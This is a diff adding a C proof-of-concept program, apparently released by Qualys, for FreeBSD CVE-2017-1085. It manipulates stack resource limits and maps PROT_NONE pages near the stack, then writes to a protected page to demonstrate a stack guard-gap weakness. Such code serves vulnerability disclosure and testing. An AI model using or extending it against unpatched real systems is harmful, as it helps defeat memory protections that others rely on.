@@ -1,0 +1,60 @@
+/*
+ * FreeBSD_CVE-2017-1085.c
+ * Copyright (C) 2017 Qualys, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <sys/time.h>
+#include <unistd.h>
+
+#define die() do { \
+    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
+    exit(EXIT_FAILURE); \
+} while (0)
+
+int
+main(const int argc, char * const argv[])
+{
+    static const struct rlimit core;
+    if (setrlimit(RLIMIT_CORE, &core)) die();
+
+    struct rlimit stack;
+    if (getrlimit(RLIMIT_STACK, &stack)) die();
+    if (stack.rlim_cur > stack.rlim_max / 3) {
+        stack.rlim_cur = stack.rlim_max / 3;
+        if (setrlimit(RLIMIT_STACK, &stack)) die();
+        execve(*argv, argv, NULL);
+        die();
+    }
+    char * prot_none = NULL;
+    for (;;) {
+        prot_none = mmap(NULL, 4096, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (prot_none == MAP_FAILED) die();
+        if ((uintptr_t)&stack < (uintptr_t)prot_none) die();
+        if ((uintptr_t)&stack - (uintptr_t)prot_none < stack.rlim_max / 3 * 2) break;
+    }
+    if (argc > 1) {
+        stack.rlim_cur = stack.rlim_max;
+        if (setrlimit(RLIMIT_STACK, &stack)) die();
+    }
+    *prot_none = 'A';
+    printf("char at %p: %02x\n", prot_none, *prot_none);
+    exit(EXIT_SUCCESS);
+}
